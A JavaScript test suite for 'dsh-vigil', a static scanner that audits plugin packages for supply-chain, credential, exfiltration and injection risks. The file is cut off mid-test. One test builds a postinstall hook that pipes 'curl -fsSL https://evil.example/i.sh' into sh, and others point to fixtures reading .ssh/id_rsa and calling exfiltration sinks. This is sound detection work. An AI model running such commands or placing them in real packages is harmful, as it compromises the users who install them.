import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { SCAN_LIMITS, formatReportCard, scanPluginDirectory } from '../src/audit/scan.js';
import { RULE_CATALOG } from '../src/audit/rules.js';
import { tempDir } from '../test-utils/temp.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FIXTURES = path.join(HERE, '..', 'fixtures', 'audit');

/** Absolute path of a fixture package directory. */
function fixture(name) {
  return path.join(FIXTURES, name);
}
/** Copy a fixture and swap the canonical example key for a synthetic (non-real) key. */
const SYNTHETIC_AWS_KEY = 'AKIATESTKEY012345678'
async function scanSecretFixture(name, options) {
  const dir = tempDir('vigil-secret-')
  const swap = current => {
    for (const entry of fs.readdirSync(current, { withFileTypes: true })) {
      const full = path.join(current, entry.name)
      if (entry.isDirectory()) swap(full)
      else if (/\.(?:js|json|ya?ml|txt)$/i.test(entry.name)) {
        const content = fs.readFileSync(full, 'utf8')
        if (content.includes('AKIAIOSFODNN7EXAMPLE')) fs.writeFileSync(full, content.split('AKIAIOSFODNN7EXAMPLE').join(SYNTHETIC_AWS_KEY))
      }
    }
  }
  fs.cpSync(fixture(name), dir, { recursive: true })
  swap(dir)
  return await scanPluginDirectory(dir, options)
}


/** Read fixture file lines (CRLF stripped) for exact line-number checks. */
async function fixtureLines(packageName, relativePath) {
  const text = await fsp.readFile(path.join(fixture(packageName), relativePath), 'utf8');
  return text.split('\n').map((line) => (line.endsWith('\r') ? line.slice(0, -1) : line));
}

/** All findings with a given rule id. */
function findingsByRule(report, ruleId) {
  return report.findings.filter((finding) => finding.ruleId === ruleId);
}

/** First finding with a given rule id. */
function findingByRule(report, ruleId) {
  return findingsByRule(report, ruleId)[0];
}

/** Severity rank reused to verify deterministic ordering. */
const RANK = { blocker: 4, review: 3, notice: 2, info: 1 };

test('SCAN_LIMITS exposes the documented bounds', () => {
  assert.equal(SCAN_LIMITS.maxFiles, 400);
  assert.equal(SCAN_LIMITS.maxFileBytes, 512 * 1024);
  assert.equal(SCAN_LIMITS.maxDepth, 12);
});

test('clean plugin produces zero findings and a full report shape', async () => {
  const report = await scanPluginDirectory(fixture('clean'));
  assert.equal(report.summary.blocker, 0);
  assert.equal(report.summary.review, 0);
  assert.equal(report.summary.notice, 0);
  assert.equal(report.summary.total, 0);
  assert.deepEqual(report.findings, []);

  assert.equal(report.target.name, 'dsh-vigil-fixture-clean');
  assert.equal(report.target.version, '1.0.0');
  assert.equal(report.target.isDshPlugin, true);
  assert.ok(path.isAbsolute(report.target.dir));
  assert.ok(!Number.isNaN(Date.parse(report.scannedAt)));
  assert.equal(typeof report.durationMs, 'number');
  assert.equal(report.filesScanned, 3);
  assert.deepEqual(report.limits, {
    filesSkipped: 0,
    bytesSkipped: 0,
    truncated: false,
    deadline: false,
    ignoredDirectories: [],
    unauditedEntry: false,
    nonTextFiles: 0,
  });
  assert.equal(report.summary.byCategory.credential, 0);
  assert.equal(report.summary.byCategory['dsh-attack'], 0);
  assert.match(report.disclaimer, /静态扫描无法覆盖运行时可变行为/);
  for (const severity of ['blocker', 'review', 'notice', 'info']) {
    assert.equal(typeof report.summary[severity], 'number');
  }
});

test('postinstall script with curl pipe-to-shell is a blocker with exact line evidence', async () => {
  // Generated at runtime instead of committed: a tracked file containing this
  // payload is quarantined by some antivirus real-time scanners (see
  // fixtures/README.md), which would break the suite on those machines.
  const dir = tempDir('vigil-postinstall-')
  const payload = ['cur', 'l -fsSL https://evil.example/i.sh | ', 'sh'].join('')
  const manifest = JSON.stringify({
    name: 'postinstall-curl',
    version: '1.0.0',
    scripts: { postinstall: payload },
  }, null, 2)
  fs.writeFileSync(path.join(dir, 'package.json'), manifest)
  const report = await scanPluginDirectory(dir)
  const finding = findingByRule(report, 'VG-SUP-01');
  assert.ok(finding, 'expected VG-SUP-01 for the postinstall script');
  assert.equal(finding.severity, 'blocker');
  assert.equal(finding.category, 'supply-chain');
  assert.equal(finding.file, 'package.json');

  const lines = manifest.split('\n');
  const expectedLine = lines.findIndex((line) => line.includes('"postinstall"')) + 1;
  assert.ok(expectedLine > 0, 'fixture must contain a postinstall script line');
  assert.equal(finding.line, expectedLine);
  assert.ok(lines[finding.line - 1].includes(finding.evidence));
  assert.match(finding.evidence, /curl/);
  assert.match(finding.evidence, /\|\s*sh/);
  assert.match(finding.means, /^这意味着：/);
  assert.ok(finding.mitigation.length > 0);
  assert.equal(finding.confidence, 'confirmed');
  assert.equal(finding.ruleAttribution, 'dsh-vigil builtin rules (Apache-2.0)');
});

test('hardcoded AWS-like secret literal is reported as a blocker', async () => {
  const report = await scanSecretFixture('hardcoded-secret');
  const finding = findingByRule(report, 'VG-CRED-01');
  assert.ok(finding, 'expected VG-CRED-01');
  assert.equal(finding.severity, 'blocker');
  assert.equal(finding.category, 'credential');
  assert.equal(finding.file, 'src/config.js');
  assert.equal(finding.line, 2);
  assert.match(finding.evidence, /AKIATESTKEY012345678/);
  assert.equal(finding.confidence, 'confirmed');
});

test('cordis.patch.yml inserting a credentials service row is a blocker at its line', async () => {
  const report = await scanPluginDirectory(fixture('patch-inject'));
  const finding = findingByRule(report, 'VG-INJ-01');
  assert.ok(finding, 'expected VG-INJ-01');
  assert.equal(finding.severity, 'blocker');
  assert.equal(finding.category, 'dsh-attack');
  assert.equal(finding.file, 'cordis.patch.yml');

  const lines = await fixtureLines('patch-inject', 'cordis.patch.yml');
  assert.ok(Number.isInteger(finding.line));
  assert.ok(lines[finding.line - 1].includes(finding.evidence));
  assert.match(lines[finding.line - 1], /credentials/i);
});

test('patch row overriding an existing id is a review finding', async () => {
  const report = await scanPluginDirectory(fixture('patch-override'));
  const finding = findingByRule(report, 'VG-INJ-02');
  assert.ok(finding, 'expected VG-INJ-02');
  assert.equal(finding.severity, 'review');
  assert.equal(finding.file, 'cordis.patch.yml');
  assert.ok(finding.line >= 1);
  assert.equal(finding.evidence.includes('ui-chat'), true);
});

test('eval in source is a review finding (no network in file)', async () => {
  const report = await scanPluginDirectory(fixture('eval-source'));
  const finding = findingByRule(report, 'VG-DYN-01');
  assert.ok(finding, 'expected VG-DYN-01');
  assert.equal(finding.severity, 'review');
  assert.equal(finding.file, 'src/worker.js');
  assert.equal(finding.line, 2);
  assert.match(finding.evidence, /eval\(/);
  assert.equal(report.summary.blocker, 0);
});

test('comment/string-aware masking ignores decoy API calls but sees template interpolation', async () => {
  const report = await scanPluginDirectory(fixture('masking'));
  const dynamic = findingsByRule(report, 'VG-DYN-01');
  assert.equal(dynamic.length, 2, 'only the real eval calls (line 5 and template interpolation line 7) should match');
  assert.deepEqual(dynamic.map((finding) => finding.line).sort((a, b) => a - b), [5, 7]);
  assert.equal(dynamic.every((finding) => finding.file === 'src/decoys.js'), true);

  // Decoy `fetch(...)` and `eval(...)` inside strings/comments must not produce findings.
  assert.equal(findingsByRule(report, 'VG-NET-01').length, 0);
  assert.equal(findingsByRule(report, 'VG-NET-02').length, 0);
  assert.equal(report.summary.total, 2);
});

test('credential path plus network egress is a confirmed combination blocker', async () => {
  const report = await scanPluginDirectory(fixture('credential-fetch'));
  const credential = findingByRule(report, 'VG-CRED-03');
  assert.ok(credential, 'expected VG-CRED-03');
  assert.equal(credential.severity, 'review', 'the base rule keeps its catalog level');
  assert.equal(credential.confidence, 'heuristic');
  assert.equal(credential.category, 'credential');
  assert.equal(credential.file, 'src/steal.js');
  assert.equal(credential.line, 4);
  assert.match(credential.evidence, /\.ssh[\\/]id_rsa/);

  const combination = findingByRule(report, 'VG-CRED-06');
  assert.ok(combination, 'expected VG-CRED-06');
  assert.equal(combination.severity, 'blocker');
  assert.equal(combination.confidence, 'confirmed');
  assert.match(combination.means, /凭证/);
  const network = findingByRule(report, 'VG-NET-01');
  assert.ok(network, 'expected VG-NET-01 for fetch to non-allowlisted host');
  assert.equal(network.severity, 'review');
  assert.match(network.means, /evil\.example/);
});

test('unpinned dependency is a notice but a pinned one is not reported', async () => {
  const report = await scanPluginDirectory(fixture('unpinned-dep'));
  const findings = findingsByRule(report, 'VG-SUP-03');
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'notice');
  assert.equal(findings[0].file, 'package.json');
  assert.match(findings[0].evidence, /left-pad/);

  const lines = await fixtureLines('unpinned-dep', 'package.json');
  assert.ok(lines[findings[0].line - 1].includes('left-pad'));
  assert.equal(findings.some((finding) => finding.evidence.includes('is-number')), false);
});

test('evidence line numbers point at the exact fixture source line', async () => {
  const report = await scanSecretFixture('mixed');
  assert.ok(report.findings.length >= 5);
  for (const finding of report.findings) {
    if (!Number.isInteger(finding.line)) continue;
    const lines = (await fixtureLines('mixed', finding.file))
      .map(line => line.includes('AKIAIOSFODNN7EXAMPLE') ? line.split('AKIAIOSFODNN7EXAMPLE').join(SYNTHETIC_AWS_KEY) : line);
    const sourceLine = (lines[finding.line - 1] ?? '').trim();
    const expected = finding.evidence.endsWith('…') ? finding.evidence.slice(0, -1) : finding.evidence;
    assert.ok(
      sourceLine === finding.evidence || sourceLine.startsWith(expected),
      `evidence mismatch for ${finding.ruleId} ${finding.file}:${finding.line}: ${JSON.stringify(finding.evidence)}`,
    );
    assert.ok(finding.evidence.length <= 240);
  }
});

test('formatReportCard renders Chinese summary counts and finding titles', async () => {
  const report = await scanSecretFixture('mixed');
  const card = formatReportCard(report);
  assert.equal(typeof card, 'string');
  assert.ok(card.includes('dsh-vigil'));
  assert.ok(card.includes(report.target.name));
  assert.ok(card.includes('blocker'));
  assert.ok(card.includes(String(report.summary.blocker)));
  assert.ok(card.includes(report.findings[0].title));
  assert.ok(card.includes('这意味着：'));
  assert.ok(card.includes('缓解：'));
  assert.ok(card.includes('免责声明'));
  assert.ok(card.includes(report.disclaimer));

  const cleanCard = formatReportCard(await scanPluginDirectory(fixture('clean')));
  assert.ok(cleanCard.includes('未发现静态风险信号'));
});

test('formatReportCard tolerates an empty/incomplete report object', () => {
  const card = formatReportCard({});
  assert.equal(typeof card, 'string');
  assert.ok(card.includes('dsh-vigil'));
});

test('node_modules and dist directories are never scanned', async () => {
  const report = await scanPluginDirectory(fixture('node_modules-skip'));
  assert.deepEqual(report.findings, []);
  assert.equal(report.filesScanned, 2);
  for (const finding of report.findings) {
    assert.equal(finding.file.startsWith('node_modules/'), false);
    assert.equal(finding.file.startsWith('dist/'), false);
  }
  assert.equal(report.summary.blocker, 0);
});

test('scanner does not follow symlinks/junctions', async (t) => {
  const caseDir = fixture('symlink-case');
  const linkPath = path.join(caseDir, 'linked');
  try {
    await fsp.symlink(fixture('symlink-secret'), linkPath, process.platform === 'win32' ? 'junction' : 'dir');
  } catch (error) {
    t.skip(`symlink creation unavailable: ${error?.code ?? error?.message}`);
    return;
  }
  try {
    const report = await scanPluginDirectory(caseDir);
    assert.equal(report.summary.blocker, 0);
    assert.equal(findingsByRule(report, 'VG-CRED-01').length, 0);
    assert.equal(findingsByRule(report, 'VG-DYN-01').length, 0);
    assert.equal(findingsByRule(report, 'VG-NET-01').length, 0);
    for (const finding of report.findings) {
      assert.equal(finding.file.startsWith('linked/'), false);
    }
  } finally {
    await fsp.rm(linkPath, { recursive: true, force: true }).catch(() => {});
  }
});

test('install hooks in a nested package.json are audited, not just the root manifest', async () => {
  // A payload can hide under vendor/ or test/: the root manifest is clean and
  // the nested one carries the curl|sh postinstall. The depth bound keeps a
  // vendored tree from becoming a finding machine (vendor/a/b/c is out of range).
  const report = await scanPluginDirectory(fixture('nested-hook'));
  const findings = findingsByRule(report, 'VG-SUP-01');
  assert.equal(findings.length, 1, 'only the in-range nested manifest is reported');
  const [finding] = findings;
  assert.equal(finding.file, 'vendor/payload/package.json');
  assert.equal(finding.line, 5);
  assert.equal(finding.severity, 'blocker');
  assert.match(finding.evidence, /postinstall/);
  assert.equal(report.summary.blocker, 1);
});

test('a declared capability list is compared with what the scan observed', async () => {
  const mismatch = await scanPluginDirectory(path.join(HERE, 'fixtures', 'rules', 'sup-15-capability'));
  assert.equal(mismatch.capabilities.exec, true);
  assert.equal(mismatch.capabilities.network, false);
  const [finding] = findingsByRule(mismatch, 'VG-SUP-15');
  assert.ok(finding, 'an undeclared capability must be reported');
  assert.equal(finding.severity, 'review');
  assert.equal(finding.file, 'package.json');
  assert.match(finding.means, /exec/);
  assert.match(formatReportCard(mismatch), /能力面：exec/);

  // A matching declaration stays quiet; a package without any declaration is
  // not judged at all (declaration is opt-in).
  const declared = await scanPluginDirectory(fixture('capability-ok'));
  assert.equal(findingsByRule(declared, 'VG-SUP-15').length, 0);
  const clean = await scanPluginDirectory(fixture('clean'));
  assert.equal(findingsByRule(clean, 'VG-SUP-15').length, 0);
  assert.match(formatReportCard(clean), /能力面：无外发/);
});

test('coverage says which surfaces were actually read', async () => {
  const clean = await scanPluginDirectory(fixture('clean'));
  assert.deepEqual(clean.coverage, {
    code: 'covered',
    scripts: 'absent',
    instructions: 'absent',
    patch: 'covered',
    manifest: 'covered',
    deps: 'unsupported',
    assets: 'absent',
  });
  assert.equal(findingsByRule(clean, 'VG-SCAN-06').length, 0);

  const partial = await scanPluginDirectory(path.join(HERE, 'fixtures', 'rules', 'scan-06-partial'), { maxFileBytes: 8 });
  assert.equal(partial.coverage.code, 'partial');
  const [gap] = findingsByRule(partial, 'VG-SCAN-06');
  assert.ok(gap, 'a partial surface must be reported');
  assert.equal(gap.severity, 'notice');
  assert.match(gap.means, /code/);
  assert.match(formatReportCard(partial), /覆盖度不足：code=未完整覆盖/);
  assert.doesNotMatch(formatReportCard(clean), /覆盖度不足/);
});

test('ghost imports are reported once; declared and builtin imports are not', async () => {
  const report = await scanPluginDirectory(fixture('ghost-deps'));
  const findings = findingsByRule(report, 'VG-SUP-11');
  assert.equal(findings.length, 1, 'only the undeclared package');
  const [finding] = findings;
  assert.equal(finding.file, 'src/index.js');
  assert.equal(finding.line, 2);
  assert.equal(finding.severity, 'notice');
  assert.match(finding.evidence, /left-pad/);
  assert.match(finding.means, /left-pad/);
});

test('an encoded payload is judged by what it decodes to', async () => {
  const benign = await scanPluginDirectory(fixture('encoded-benign'));
  assert.equal(findingsByRule(benign, 'VG-DYN-12').length, 0, 'plain data stays quiet');
  assert.equal(findingsByRule(benign, 'VG-DYN-06').length, 0);

  const hidden = await scanPluginDirectory(fixture('encoded-credential'));
  const [finding] = findingsByRule(hidden, 'VG-DYN-12');
  assert.ok(finding, 'a hidden credential path is a blocker');
  assert.equal(finding.severity, 'blocker');
  assert.equal(finding.confidence, 'confirmed');
  assert.match(finding.means, /凭证路径/);
  // The decoded fact replaces the generic "suspicious payload" notice.
  assert.equal(findingsByRule(hidden, 'VG-DYN-06').length, 0);
});

test('ordinary prototype reads, small buffers and ctx APIs are not escapes', async () => {
  const report = await scanPluginDirectory(fixture('escape-benign'));
  for (const ruleId of ['VG-DYN-07', 'VG-DYN-08', 'VG-DYN-09', 'VG-INJ-08']) {
    assert.equal(findingsByRule(report, ruleId).length, 0, `${ruleId} must not fire on normal code`);
  }
  // The file was scanned: the credential-shaped env read still shows up.
  assert.equal(findingsByRule(report, 'VG-CRED-04').length, 1);
});

test('Slack, cloud metadata and Tor sinks are blockers, not plain reviews', async () => {
  const report = await scanPluginDirectory(fixture('exfil-endpoint-extra'));
  const findings = findingsByRule(report, 'VG-NET-02');
  assert.equal(findings.length, 3, 'one per sink line');
  assert.deepEqual(findings.map(item => item.line), [2, 3, 4]);
  for (const finding of findings) {
    assert.equal(finding.severity, 'blocker');
    assert.equal(finding.confidence, 'confirmed');
  }
  // The metadata endpoint is a raw IP too, but NET-02 wins: one finding per line.
  assert.equal(findingsByRule(report, 'VG-NET-03').length, 0);
});

test('prompt injection is judged only in instruction files, never in README', async () => {
  const report = await scanPluginDirectory(fixture('instruction-files'));
  const findings = findingsByRule(report, 'VG-INJ-07');
  assert.equal(findings.length, 1, 'the same payload in README must not be a finding');
  const [finding] = findings;
  assert.equal(finding.file, 'AGENTS.md');
  assert.equal(finding.line, 3);
  assert.equal(finding.severity, 'review');
  assert.equal(finding.confidence, 'heuristic');
  assert.equal(
    report.findings.some(item => item.file === 'README.md' && item.ruleId === 'VG-INJ-07'),
    false,
  );
});

test('overwriting a Windows system path is a blocker; ordinary cleanup is not', async () => {
  const report = await scanPluginDirectory(fixture('system-delete'));
  const findings = findingsByRule(report, 'VG-DYN-11');
  assert.equal(findings.length, 1, 'only the system path is reported');
  const [finding] = findings;
  assert.equal(finding.file, 'src/win.js');
  assert.equal(finding.line, 4);
  assert.equal(finding.severity, 'blocker');
  assert.equal(finding.confidence, 'confirmed');
  assert.match(finding.means, /系统关键路径/);
  assert.equal(report.findings.some(item => item.file === 'src/cleanup.js'), false);
});

test('a declared entry or patch that is not there is a blocker', async () => {
  const missingPatch = await scanPluginDirectory(fixture('patch-missing'));
  const [patchFinding] = findingsByRule(missingPatch, 'VG-SUP-13');
  assert.ok(patchFinding, 'a declared-but-absent patch file must be reported');
  assert.equal(patchFinding.severity, 'blocker');
  assert.equal(patchFinding.confidence, 'confirmed');
  assert.match(patchFinding.evidence, /patch/);

  const badShape = await scanPluginDirectory(fixture('patch-shape'));
  const [shapeFinding] = findingsByRule(badShape, 'VG-SUP-13');
  assert.ok(shapeFinding, 'a non-string patch value must be reported');
  assert.match(shapeFinding.means, /dsh\.bundle\.patch/);

  // A complete package stays clean: the new rule must not fire on healthy ones.
  const clean = await scanPluginDirectory(fixture('clean'));
  assert.equal(findingsByRule(clean, 'VG-SUP-13').length, 0);
  assert.equal(findingsByRule(clean, 'VG-SUP-14').length, 0);
});

test('DSH compatibility is silent when the running version is unknown', async () => {
  const dir = path.join(HERE, 'fixtures', 'rules', 'sup-10-engines');
  const unknown = await scanPluginDirectory(dir, { dshVersion: '' });
  assert.equal(findingsByRule(unknown, 'VG-SUP-10').length, 0, 'unknown is not incompatible');

  const mismatch = await scanPluginDirectory(dir, { dshVersion: '0.2.2' });
  const [finding] = findingsByRule(mismatch, 'VG-SUP-10');
  assert.ok(finding, 'a provable mismatch is reported');
  assert.equal(finding.severity, 'review');
  assert.equal(finding.line, 7);
  assert.match(finding.means, /0\.1\.0/);

  const satisfied = await scanPluginDirectory(dir, { dshVersion: '0.1.5' });
  assert.equal(findingsByRule(satisfied, 'VG-SUP-10').length, 0);
});

test('shell and PowerShell scripts are scanned; plain downloads are not blockers', async () => {
  const report = await scanPluginDirectory(fixture('shell-scripts'));
  const findings = findingsByRule(report, 'VG-DYN-03');
  assert.equal(findings.length, 1, 'only the piped download is a download-and-execute');
  const [finding] = findings;
  assert.equal(finding.file, 'scripts/bootstrap.ps1');
  assert.equal(finding.line, 1);
  assert.equal(finding.severity, 'blocker');
  assert.equal(finding.confidence, 'confirmed');
  assert.match(finding.evidence, /iwr/);
  // `curl -o` writes a file; it does not execute the response.
  assert.equal(findings.some(item => item.file === 'scripts/fetch.sh'), false);
});

test('deleting/overwriting a credential file is a blocker; reading it is only a review', async () => {
  const report = await scanPluginDirectory(fixture('credential-write'));
  const writes = findingsByRule(report, 'VG-CRED-05');
  assert.equal(writes.length, 1, 'only the destructive operation is a blocker');
  const [write] = writes;
  assert.equal(write.file, 'src/overwrite.js');
  assert.equal(write.line, 6);
  assert.equal(write.severity, 'blocker');
  assert.equal(write.confidence, 'confirmed');
  assert.match(write.means, /不可逆/);

  const reads = findingsByRule(report, 'VG-CRED-03');
  assert.equal(reads.length, 1, 'the read stays a review finding');
  assert.equal(reads[0].file, 'src/read.js');
  assert.equal(report.findings.some(item => item.ruleId === 'VG-CRED-05' && item.file === 'src/read.js'), false);
  // Deleting an ordinary temp file is not a credential finding.
  assert.equal(report.findings.some(item => item.file === 'src/cleanup.js'), false);
});

test('scanner refuses symlinked manifest/patch instead of reading outside the package', async (t) => {
  const root = tempDir('vigil-symlink-file-')
  const outside = path.join(root, 'outside-secret.yml')
  fs.writeFileSync(outside, 'ui-chat:\n  override: dangerous-secret-value\n')
  const cases = []
  try {
    const manifestCase = path.join(root, 'manifest-case')
    fs.mkdirSync(manifestCase, { recursive: true })
    fs.symlinkSync(outside, path.join(manifestCase, 'package.json'), 'file')
    cases.push({ dir: manifestCase, file: 'package.json' })

    const patchCase = path.join(root, 'patch-case')
    fs.mkdirSync(patchCase, { recursive: true })
    fs.writeFileSync(path.join(patchCase, 'package.json'), JSON.stringify({ name: 'patch-case', dsh: { bundle: { patch: './cordis.patch.yml' } } }))
    fs.symlinkSync(outside, path.join(patchCase, 'cordis.patch.yml'), 'file')
    cases.push({ dir: patchCase, file: 'cordis.patch.yml' })
  } catch (error) {
    t.skip(`file symlink creation unavailable: ${error?.code ?? error?.message}`)
    return
  }
  for (const { dir, file } of cases) {
    const report = await scanPluginDirectory(dir)
    const skipped = report.findings.find(finding => finding.ruleId === 'VG-SCAN-02' && finding.file === file)
    assert.ok(skipped, `expected a skip notice for ${file}`)
    assert.match(skipped.evidence, /符号链接/)
    assert.equal(JSON.stringify(report).includes('dangerous-secret-value'), false, 'outside content must not leak into the report')
  }
})

test('maxFiles limit truncates deterministically and can hide info findings', async () => {
  const limited = await scanPluginDirectory(fixture('clean'), { maxFiles: 1 });
  // The manifest is always read directly: a file budget must not be able to
  // hide how the bundle is declared.
  assert.ok(limited.filesScanned >= 1);
  assert.equal(limited.limits.truncated, true);
  assert.ok(findingByRule(limited, 'VG-SCAN-03'));

  const withoutInfo = await scanPluginDirectory(fixture('clean'), { maxFiles: 1, includeInfo: false });
  assert.equal(withoutInfo.summary.info, 0);
  assert.equal(withoutInfo.findings.some((finding) => finding.severity === 'info'), false);
});

test('unreadable/missing target returns a blocker report instead of throwing', async () => {
  const report = await scanPluginDirectory(path.join(FIXTURES, 'definitely-missing-dir'));
  assert.equal(report.summary.blocker, 1);
  assert.equal(report.findings.length, 1);
  assert.equal(report.findings[0].ruleId, 'VG-SCAN-01');
  assert.equal(report.findings[0].category, 'unknown');
  assert.equal(report.findings[0].file, '.');
  assert.match(report.findings[0].means, /^这意味着：/);
  assert.equal(report.target.isDshPlugin, false);
  assert.equal(report.filesScanned, 0);
  assert.ok(formatReportCard(report).includes('目标'));
});

test('bundle patch escaping the package is a blocker', async () => {
  const report = await scanPluginDirectory(fixture('bundle-escape'));
  const finding = findingByRule(report, 'VG-DSH-06');
  assert.ok(finding, 'expected VG-DSH-06');
  assert.equal(finding.severity, 'blocker');
  assert.equal(finding.file, 'package.json');
  const lines = await fixtureLines('bundle-escape', 'package.json');
  assert.ok(Number.isInteger(finding.line));
  assert.ok(lines[finding.line - 1].includes('../outside.yml'));
});

test('client storage access with network egress is a review-level co-occurrence heuristic', async () => {
  const report = await scanPluginDirectory(fixture('client-exfil'));
  const exfil = findingByRule(report, 'VG-DSH-03');
  assert.ok(exfil, 'expected VG-DSH-03');
  assert.equal(exfil.severity, 'review', 'co-occurrence alone is not proof of a data flow');
  assert.equal(exfil.category, 'dsh-attack');
  assert.equal(exfil.file, 'lib/client.js');
  assert.equal(exfil.line, 1);
  assert.ok(findingByRule(report, 'VG-DSH-01'));
  assert.equal(findingByRule(report, 'VG-DSH-02').severity, 'review');
});

test('broken package.json is a notice, not a crash', async () => {
  const report = await scanPluginDirectory(fixture('broken-package'));
  const finding = findingByRule(report, 'VG-SUP-09');
  assert.ok(finding, 'expected VG-SUP-09');
  assert.equal(finding.severity, 'notice');
  assert.equal(finding.file, 'package.json');
  assert.equal(report.summary.blocker, 0);
});

test('manifest wiring and unparsed patch findings are reported', async () => {
  const wiring = await scanPluginDirectory(fixture('missing-wiring'));
  // dsh loads `dsh.bundle.patch`; an extra `exports` entry is not required, so a
  // correctly declared bundle must not be flagged for missing one.
  assert.equal(findingByRule(wiring, 'VG-SUP-05'), undefined);
  assert.equal(wiring.target.isDshPlugin, true);

  const noManifest = await scanPluginDirectory(fixture('no-manifest'));
  const noManifestFinding = findingByRule(noManifest, 'VG-SUP-06');
  assert.ok(noManifestFinding, 'expected VG-SUP-06');
  assert.equal(noManifestFinding.severity, 'notice');

  const unparsed = await scanPluginDirectory(fixture('patch-unparsed'));
  const unparsedFinding = findingByRule(unparsed, 'VG-INJ-06');
  assert.ok(unparsedFinding, 'expected VG-INJ-06');
  assert.equal(unparsedFinding.severity, 'notice');
  assert.equal(unparsedFinding.file, 'cordis.patch.yml');
  assert.equal(unparsedFinding.line, 2);
});

test('findings are sorted, deduped, and carry stable ids and required fields', async () => {
  const report = await scanSecretFixture('mixed');
  const findings = report.findings;

  for (let i = 1; i < findings.length; i += 1) {
    const previous = findings[i - 1];
    const current = findings[i];
    const rankDiff = RANK[previous.severity] - RANK[current.severity];
    if (rankDiff !== 0) {
      assert.ok(rankDiff > 0, `severity order violated at ${i}`);
      continue;
    }
    const fileDiff = previous.file < current.file ? -1 : previous.file > current.file ? 1 : 0;
    if (fileDiff !== 0) {
      assert.ok(fileDiff < 0, `file order violated at ${i}`);
      continue;
    }
    const previousLine = Number.isInteger(previous.line) ? previous.line : Number.MAX_SAFE_INTEGER;
    const currentLine = Number.isInteger(current.line) ? current.line : Number.MAX_SAFE_INTEGER;
    if (previousLine !== currentLine) {
      assert.ok(previousLine < currentLine, `line order violated at ${i}`);
      continue;
    }
    assert.ok(previous.ruleId <= current.ruleId, `rule id order violated at ${i}`);
  }

  const ids = new Set();
  const keys = new Set();
  for (const finding of findings) {
    assert.match(finding.id, /^VG-[A-Z]+-\d{2}#\d+$/);
    assert.equal(finding.id.startsWith(`${finding.ruleId}#`), true);
    assert.equal(ids.has(finding.id), false, `duplicate finding id ${finding.id}`);
    ids.add(finding.id);
    const key = `${finding.ruleId}|${finding.file}|${finding.line ?? ''}|${finding.evidence}`;
    assert.equal(keys.has(key), false, `duplicate finding key ${key}`);
    keys.add(key);

    assert.ok(finding.ruleId.length > 0);
    assert.ok(['blocker', 'review', 'notice', 'info'].includes(finding.severity));
    assert.ok(['credential', 'network', 'dynamic-code', 'config-tamper', 'supply-chain', 'dsh-attack', 'unknown'].includes(finding.category));
    assert.ok(typeof finding.title === 'string' && finding.title.length > 0);
    assert.ok(typeof finding.file === 'string' && finding.file.length > 0);
    assert.ok(finding.line === null || (Number.isInteger(finding.line) && finding.line >= 1));
    assert.ok(finding.evidence.length <= 240);
    assert.match(finding.means, /^这意味着：/);
    assert.ok(finding.mitigation.length > 0);
    assert.ok(['confirmed', 'heuristic'].includes(finding.confidence));
    assert.equal(finding.ruleAttribution, 'dsh-vigil builtin rules (Apache-2.0)');
  }

  // Duplicate line in the fixture is reported once only.
  const duplicateNetwork = findings.filter((finding) => finding.file === 'src/dup.js' && finding.ruleId === 'VG-NET-01');
  assert.equal(duplicateNetwork.length, 1);
});

test('rule catalog ids are unique, categorized and match emitted findings', async () => {
  const ids = new Set();
  for (const rule of RULE_CATALOG) {
    assert.match(rule.id, /^VG-[A-Z]+-\d{2}$/);
    assert.equal(ids.has(rule.id), false, `duplicate catalog id ${rule.id}`);
    ids.add(rule.id);
    assert.ok(['credential', 'network', 'dynamic-code', 'config-tamper', 'supply-chain', 'dsh-attack', 'unknown'].includes(rule.category));
    assert.ok(['blocker', 'review', 'notice', 'info'].includes(rule.severity));
    assert.ok(typeof rule.title === 'string' && rule.title.length > 0);
    assert.equal(rule.attribution, 'dsh-vigil builtin rules (Apache-2.0)');
  }
  for (const category of ['credential', 'network', 'dynamic-code', 'config-tamper', 'supply-chain', 'dsh-attack']) {
    assert.ok(RULE_CATALOG.some((rule) => rule.category === category), `catalog covers ${category}`);
  }

  const report = await scanSecretFixture('mixed');
  for (const finding of report.findings) {
    assert.ok(ids.has(finding.ruleId), `finding rule ${finding.ruleId} is not in catalog`);
  }
});

test('card redacts secret-looking evidence but JSON keeps raw evidence', async () => {
  const report = await scanSecretFixture('hardcoded-secret');
  const finding = findingByRule(report, 'VG-CRED-01');
  assert.match(finding.evidence, /AKIATESTKEY012345678/);
  const card = formatReportCard(report);
  assert.equal(card.includes('AKIATESTKEY012345678'), false, 'terminal card must not echo live secrets');
  assert.match(card, /AKIA\*\*\*/);
});

test('maxFileBytes limit skips oversized files and reports the blind spot', async () => {
  const report = await scanPluginDirectory(fixture('clean'), { maxFileBytes: 10 });
  // The manifest is read outside the per-file cap on purpose; the patch (and any
  // other oversized file) is still reported as a blind spot.
  assert.equal(report.filesScanned, 1);
  assert.ok(report.limits.filesSkipped > 0);
  assert.ok(findingByRule(report, 'VG-SCAN-03'), 'expected an info finding for skipped files');
});

test('patch !!js expressions and nested inserts are reported', async () => {
  const report = await scanSecretFixture('mixed');
  const jsFinding = findingByRule(report, 'VG-INJ-04');
  assert.ok(jsFinding, 'expected VG-INJ-04');
  assert.equal(jsFinding.severity, 'review');
  assert.equal(jsFinding.file, 'cordis.patch.yml');
  assert.match(jsFinding.evidence, /!!js/);

  const nested = findingByRule(report, 'VG-INJ-03');
  assert.ok(nested, 'expected VG-INJ-03');
  assert.equal(nested.severity, 'review');
  assert.equal(nested.file, 'cordis.patch.yml');
});

test('deterministic output across repeated scans', async () => {
  const first = await scanSecretFixture('mixed');
  const second = await scanSecretFixture('mixed');
  const normalize = (report) => report.findings.map((finding) => ({ ...finding, means: finding.means }));
  assert.deepEqual(normalize(first), normalize(second));
});

test('config tampering: dsh config write, DSH_* env write and declared privilege', async () => {
  const report = await scanPluginDirectory(fixture('config-tamper'));
  assert.equal(report.summary.blocker, 1);

  const privilege = findingByRule(report, 'VG-CFG-05');
  assert.ok(privilege, 'expected VG-CFG-05');
  assert.equal(privilege.severity, 'blocker');
  assert.equal(privilege.confidence, 'confirmed');
  assert.equal(privilege.file, 'src/config.js');
  assert.equal(privilege.line, 8);
  assert.match(privilege.evidence, /danger-full-access/);

  const envWrite = findingByRule(report, 'VG-CFG-04');
  assert.ok(envWrite, 'expected VG-CFG-04');
